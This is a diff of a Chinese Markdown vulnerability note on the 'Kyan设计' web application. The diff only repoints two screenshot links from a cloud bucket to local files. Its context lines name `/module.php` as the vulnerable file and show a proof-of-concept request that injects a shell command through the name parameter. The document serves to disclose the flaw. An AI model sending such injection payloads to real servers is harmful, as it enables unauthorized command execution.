@@ -20,7 +20,7 @@ app="Kyan设计"
 
 登录页面如下
 
-![image-20220519175106605](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191751171.png)
+![image-20220519175106605](./images/202205191751171.png)
 
 存在漏洞的文件: `/module.php`
 
@@ -173,4 +173,4 @@ if (isset($_GET['cmd']) && isset($_GET['name'])) {
 /module.php?cmd=delete&name=;id>1.txt;
 ```
 
-![image-20220519175150343](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191751384.png)
+![image-20220519175150343](./images/202205191751384.png)
